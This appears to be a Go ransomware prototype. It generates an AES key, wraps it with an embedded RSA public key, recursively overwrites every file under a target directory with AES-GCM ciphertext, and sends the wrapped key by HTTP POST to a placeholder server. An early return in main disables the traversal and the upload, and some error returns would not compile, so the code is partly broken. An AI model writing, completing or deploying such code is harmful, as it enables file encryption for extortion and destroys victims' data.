package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/sha256"
	"encoding/pem"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"runtime"
	"io"
	"os"
)

var key []byte
var fileSep string
var serverPub = []byte(`
-----BEGIN PUBLIC KEY-----
MIIBCgKCAQEA3pulN61rzbvZw7gREV4+BY9V+lyUAfrecYzIupzdv/RnU1Qrgo9O
2OGHA4wfwrXANQb1c2Zp0c7ZLTISpJaMjjhu1jrkpId7GuFYExMQEF8gxl01w2/r
K1aHmNNMBSJQTap1F2JBw81zWq4EKMt2+Az+sLIvSRR0gZ0GrJ7Fx/zlreFu+xH8
Vxd5Zuq711ChZB7yYYiX3/wo/0KN4CuZxPRANMmEuap964c+J/PNPFJDbqQBDEN0
RRo7ge9eu0K2zjUGZUBmBetpPss2aagO+5+82YoRpS4m0Zza/jndv3q9zoOdivUN
fxT6HN0CH2kRXUgFVOvae3cW3R1rPi8/cwIDAQAB
-----END PUBLIC KEY-----`)

func main() {

	home, _ := os.UserHomeDir()
	fmt.Println("home ", home)

	//testdir := ".\\test"
	testdir := "./test"

	opSystem := runtime.GOOS
	fileSep = "/"
	if opSystem == "windows" {
		fileSep = "\\"
	}

	err := genKey()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	hexKey, err := encryptKey()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	return
	traverseFiles(testdir)
	sendKey(hexKey)
}

func genKey() error {
	key = make([]byte, 32)
	_, err := rand.Read(key)

	//fmt.Println("key ", key)
	//fmt.Printf("%x ", key)
	return err
}

func encryptKey() (string, error) {
	block, _ := pem.Decode(serverPub)
	if block == nil || block.Type != "PUBLIC KEY" {
		fmt.Println("invalid pub key")
		os.Exit(1)
	}
	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		fmt.Println(err)
		return err
	}

	encKey, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		pub,
		key,
		nil)
	if err != nil {
		fmt.Println(err)
		return err
	}
	encHex := hex.EncodeToString(encKey)
	fmt.Println(encHex)
	return encHex, nil
}


func traverseFiles(path string) {
	var dirs []string

	files, err := os.ReadDir(path)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	for _, file := range files {
		if file.IsDir() {
			base := path + fileSep + file.Name()
			dirs = append(dirs, base)
			fmt.Println("dir path: ", base)
		} else {
			base := path + fileSep + file.Name()

			fmt.Println("file to enc: ", base)
			encryptFile(base)
		}
	}
	for _, dir := range dirs {
		traverseFiles(dir)
	}
}

func encryptFile(path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fmt.Println("path ", path)
	fmt.Println("data ", data)


	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	nonce := make([]byte, gcm.NonceSize())

	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	enc := gcm.Seal(nonce, nonce, data, nil)
	fmt.Println("enc data ", enc)
	err = os.WriteFile(path, enc, 0777)
	if err != nil {
		fmt.Println(err)
	}
}

func sendKey(hexKey string) error {
	r := map[string]string{"encKey": hexKey}
	json_data, err := json.Marshal(r)
	if err != nil {
		fmt.Println(err)
		return err
	}
	resp, err := http.Post("https://addr", "application/json", bytes.NewBuffer(json_data))
	if err != nil || resp.StatusCode != 200 {
		fmt.Println(err)
		return err
	}
	return nil
}
